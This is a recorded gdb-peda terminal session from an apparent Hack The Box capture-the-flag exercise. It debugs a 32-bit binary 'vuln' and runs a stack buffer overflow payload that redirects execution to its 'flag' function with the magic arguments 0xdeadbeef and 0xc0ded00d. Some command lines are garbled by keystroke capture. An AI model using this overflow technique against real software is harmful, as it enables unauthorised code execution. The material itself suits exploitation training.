+EIP: 0x8049238 (<flag+86>:	push   0x40)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804922d <flag+75>:	call   0x8049080 <exit@plt>
+   0x8049232 <flag+80>:	sub    esp,0x4
+   0x8049235 <flag+83>:	push   DWORD PTR [ebp-0xc]
+=> 0x8049238 <flag+86>:	push   0x40
+   0x804923a <flag+88>:	lea    eax,[ebp-0x4c]
+   0x804923d <flag+91>:	push   eax
+   0x804923e <flag+92>:	call   0x8049050 <fgets@plt>
+   0x8049243 <flag+97>:	add    esp,0x10
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0fc --> 0x804e170 --> 0xfbad2488 
+0004| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0008| 0xffffd104 ('A' <repeats 76 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0012| 0xffffd108 ('A' <repeats 72 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0016| 0xffffd10c ('A' <repeats 68 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0020| 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0024| 0xffffd114 ('A' <repeats 60 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0028| 0xffffd118 ('A' <repeats 56 times>, "p\341\004\b", 'A' <repeats 12 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08049238 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804e170 --> 0xfbad2488 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x2c00 ('')
+EDX: 0x2c2c2c2c (',,,,')
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd0f8 --> 0x40 ('@')
+EIP: 0x804923a (<flag+88>:	lea    eax,[ebp-0x4c])
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049232 <flag+80>:	sub    esp,0x4
+   0x8049235 <flag+83>:	push   DWORD PTR [ebp-0xc]
+   0x8049238 <flag+86>:	push   0x40
+=> 0x804923a <flag+88>:	lea    eax,[ebp-0x4c]
+   0x804923d <flag+91>:	push   eax
+   0x804923e <flag+92>:	call   0x8049050 <fgets@plt>
+   0x8049243 <flag+97>:	add    esp,0x10
+   0x8049246 <flag+100>:	cmp    DWORD PTR [ebp+0x8],0xdeadbeef
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0f8 --> 0x40 ('@')
+0004| 0xffffd0fc --> 0x804e170 --> 0xfbad2488 
+0008| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0012| 0xffffd104 ('A' <repeats 76 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0016| 0xffffd108 ('A' <repeats 72 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0020| 0xffffd10c ('A' <repeats 68 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0024| 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0028| 0xffffd114 ('A' <repeats 60 times>, "p\341\004\b", 'A' <repeats 12 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804923a in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x2c00 ('')
+EDX: 0x2c2c2c2c (',,,,')
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd0f8 --> 0x40 ('@')
+EIP: 0x804923d (<flag+91>:	push   eax)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049235 <flag+83>:	push   DWORD PTR [ebp-0xc]
+   0x8049238 <flag+86>:	push   0x40
+   0x804923a <flag+88>:	lea    eax,[ebp-0x4c]
+=> 0x804923d <flag+91>:	push   eax
+   0x804923e <flag+92>:	call   0x8049050 <fgets@plt>
+   0x8049243 <flag+97>:	add    esp,0x10
+   0x8049246 <flag+100>:	cmp    DWORD PTR [ebp+0x8],0xdeadbeef
+   0x804924d <flag+107>:	jne    0x8049269 <flag+135>
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0f8 --> 0x40 ('@')
+0004| 0xffffd0fc --> 0x804e170 --> 0xfbad2488 
+0008| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0012| 0xffffd104 ('A' <repeats 76 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0016| 0xffffd108 ('A' <repeats 72 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0020| 0xffffd10c ('A' <repeats 68 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0024| 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0028| 0xffffd114 ('A' <repeats 60 times>, "p\341\004\b", 'A' <repeats 12 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804923d in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x2c00 ('')
+EDX: 0x2c2c2c2c (',,,,')
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd0f4 --> 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+EIP: 0x804923e (<flag+92>:	call   0x8049050 <fgets@plt>)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049238 <flag+86>:	push   0x40
+   0x804923a <flag+88>:	lea    eax,[ebp-0x4c]
+   0x804923d <flag+91>:	push   eax
+=> 0x804923e <flag+92>:	call   0x8049050 <fgets@plt>
+   0x8049243 <flag+97>:	add    esp,0x10
+   0x8049246 <flag+100>:	cmp    DWORD PTR [ebp+0x8],0xdeadbeef
+   0x804924d <flag+107>:	jne    0x8049269 <flag+135>
+   0x804924f <flag+109>:	cmp    DWORD PTR [ebp+0xc],0xc0ded00d
+Guessed arguments:
+arg[0]: 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+arg[1]: 0x40 ('@')
+arg[2]: 0x804e170 --> 0xfbad2488 
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0f4 --> 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0004| 0xffffd0f8 --> 0x40 ('@')
+0008| 0xffffd0fc --> 0x804e170 --> 0xfbad2488 
+0012| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0016| 0xffffd104 ('A' <repeats 76 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0020| 0xffffd108 ('A' <repeats 72 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0024| 0xffffd10c ('A' <repeats 68 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0028| 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804923e in flag ()
+gdb-peda$ nn
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd110 ("YOU DID IT. ABOUT DAMN TIME\n")
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x804e208 --> 0x0 
+EDX: 0xffffd110 ("YOU DID IT. ABOUT DAMN TIME\n")
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd0f4 --> 0xffffd110 ("YOU DID IT. ABOUT DAMN TIME\n")
+EIP: 0x8049243 (<flag+97>:	add    esp,0x10)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804923a <flag+88>:	lea    eax,[ebp-0x4c]
+   0x804923d <flag+91>:	push   eax
+   0x804923e <flag+92>:	call   0x8049050 <fgets@plt>
+=> 0x8049243 <flag+97>:	add    esp,0x10
+   0x8049246 <flag+100>:	cmp    DWORD PTR [ebp+0x8],0xdeadbeef
+   0x804924d <flag+107>:	jne    0x8049269 <flag+135>
+   0x804924f <flag+109>:	cmp    DWORD PTR [ebp+0xc],0xc0ded00d
+   0x8049256 <flag+116>:	jne    0x804926c <flag+138>
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0f4 --> 0xffffd110 ("YOU DID IT. ABOUT DAMN TIME\n")
+0004| 0xffffd0f8 --> 0x40 ('@')
+0008| 0xffffd0fc --> 0x804e170 --> 0xfbad2488 
+0012| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0016| 0xffffd104 ('A' <repeats 12 times>, "YOU DID IT. ABOUT DAMN TIME\n")
+0020| 0xffffd108 ("AAAAAAAAYOU DID IT. ABOUT DAMN TIME\n")
+0024| 0xffffd10c ("AAAAYOU DID IT. ABOUT DAMN TIME\n")
+0028| 0xffffd110 ("YOU DID IT. ABOUT DAMN TIME\n")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08049243 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd110 ("YOU DID IT. ABOUT DAMN TIME\n")
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x804e208 --> 0x0 
+EDX: 0xffffd110 ("YOU DID IT. ABOUT DAMN TIME\n")
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd104 ('A' <repeats 12 times>, "YOU DID IT. ABOUT DAMN TIME\n")
+EIP: 0x8049246 (<flag+100>:	cmp    DWORD PTR [ebp+0x8],0xdeadbeef)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804923d <flag+91>:	push   eax
+   0x804923e <flag+92>:	call   0x8049050 <fgets@plt>
+   0x8049243 <flag+97>:	add    esp,0x10
+=> 0x8049246 <flag+100>:	cmp    DWORD PTR [ebp+0x8],0xdeadbeef
+   0x804924d <flag+107>:	jne    0x8049269 <flag+135>
+   0x804924f <flag+109>:	cmp    DWORD PTR [ebp+0xc],0xc0ded00d
+   0x8049256 <flag+116>:	jne    0x804926c <flag+138>
+   0x8049258 <flag+118>:	sub    esp,0xc
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd104 ('A' <repeats 12 times>, "YOU DID IT. ABOUT DAMN TIME\n")
+0004| 0xffffd108 ("AAAAAAAAYOU DID IT. ABOUT DAMN TIME\n")
+0008| 0xffffd10c ("AAAAYOU DID IT. ABOUT DAMN TIME\n")
+0012| 0xffffd110 ("YOU DID IT. ABOUT DAMN TIME\n")
+0016| 0xffffd114 ("DID IT. ABOUT DAMN TIME\n")
+0020| 0xffffd118 ("IT. ABOUT DAMN TIME\n")
+0024| 0xffffd11c ("ABOUT DAMN TIME\n")
+0028| 0xffffd120 ("T DAMN TIME\n")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08049246 in flag ()
+gdb-peda$ x/x $ebp
+0xffffd15c:	0x41
+gdb-peda$ x/w $ebp + 0x8
+0xffffd164:	0xffffd224
+gdb-peda$ distx/x 64 $esp
+A syntax error in expression, near `$esp'.
+gdb-peda$ x/x64 $esp $esp $esp $esp6 $esp4 $espx $esp
+0xffffd104:	0x41414141	0x41414141	0x41414141	0x20554f59
+0xffffd114:	0x20444944	0x202e5449	0x554f4241	0x41442054
+0xffffd124:	0x54204e4d	0x0a454d49	0x41414100	0x41414141
+0xffffd134:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd144:	0x41414141	0x41414141	0x41414141	0x0804e170
+0xffffd154:	0x41414141	0x41414141	0x41414141	0x00000000
+0xffffd164:	0xffffd224	0xffffd22c	0x000003e8	0xffffd190
+0xffffd174:	0x00000000	0x00000000	0xf7df7f21	0xf7fb4000
+0xffffd184:	0xf7fb4000	0x00000000	0xf7df7f21	0x00000001
+0xffffd194:	0xffffd224	0xffffd22c	0xffffd1b4	0x00000001
+0xffffd1a4:	0x00000000	0xf7fb4000	0xf7fe570a	0xf7ffd000
+0xffffd1b4:	0x00000000	0xf7fb4000	0x00000000	0x00000000
+0xffffd1c4:	0x3376c29d	0x7228248d	0x00000000	0x00000000
+0xffffd1d4:	0x00000000	0x00000001	0x080490d0	0x00000000
+0xffffd1e4:	0xf7fead50	0xf7fe5960	0x0804c000	0x00000001
+0xffffd1f4:	0x080490d0	0x00000000	0x08049102	0x080492b1
+gdb-peda$ x/64x $espx64w $ebp + 0x8x64 $esp64xr < <(python -c "print('A' * 188) + '\xe2\x91\x04\x08' + '\x00\x00\x00\x00' + '\xef\xbe\xad\xde' + '\r\xd0\xde\xc0' ")
+Starting program: /home/ubuntu/CTF/hackthebox/vuln < <(python -c "print('A' * 188) + '\xe2\x91\x04\x08' + '\x00\x00\x00\x00' + '\xef\xbe\xad\xde' + '\r\xd0\xde\xc0' ")
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAâ‘
+[----------------------------------registers-----------------------------------]
+EAX: 0xc1 
+EBX: 0x41414141 ('AAAA')
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd158 ("AAAAAAAA")
+EIP: 0x80491e6 (<flag+4>:	sub    esp,0x54)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491e2 <flag>:	push   ebp
+   0x80491e3 <flag+1>:	mov    ebp,esp
+   0x80491e5 <flag+3>:	push   ebx
+=> 0x80491e6 <flag+4>:	sub    esp,0x54
+   0x80491e9 <flag+7>:	call   0x8049120 <__x86.get_pc_thunk.bx>
+   0x80491ee <flag+12>:	add    ebx,0x2e12
+   0x80491f4 <flag+18>:	sub    esp,0x8
+   0x80491f7 <flag+21>:	lea    eax,[ebx-0x1ff8]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd158 ("AAAAAAAA")
+0004| 0xffffd15c ("AAAA")
+0008| 0xffffd160 --> 0x0 
+0012| 0xffffd164 --> 0xdeadbeef 
+0016| 0xffffd168 --> 0xc0ded00d 
+0020| 0xffffd16c --> 0x300 
+0024| 0xffffd170 --> 0xffffd190 --> 0x1 
+0028| 0xffffd174 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080491e6 in flag ()
+gdb-peda$ nc
+Continuing.
+YOU DID IT. ABOUT DAMN TIME
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x1c 
+EBX: 0x41414141 ('AAAA')
+ECX: 0x1c 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd164 --> 0xdeadbeef 
+EIP: 0x0
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x0
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd164 --> 0xdeadbeef 
+0004| 0xffffd168 --> 0xc0ded00d 
+0008| 0xffffd16c --> 0x300 
+0012| 0xffffd170 --> 0xffffd190 --> 0x1 
+0016| 0xffffd174 --> 0x0 
+0020| 0xffffd178 --> 0x0 
+0024| 0xffffd17c --> 0xf7df7f21 (<__libc_start_main+241>:	add    esp,0x10)
+0028| 0xffffd180 --> 0xf7fb4000 --> 0x1d4d8c 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00000000 in ?? ()
+gdb-peda$ quit
+ubuntu@ubuntu:~/CTF/hackthebox$ exit
+exit
+
+Script done on 2021-01-11 21:15:39-0800
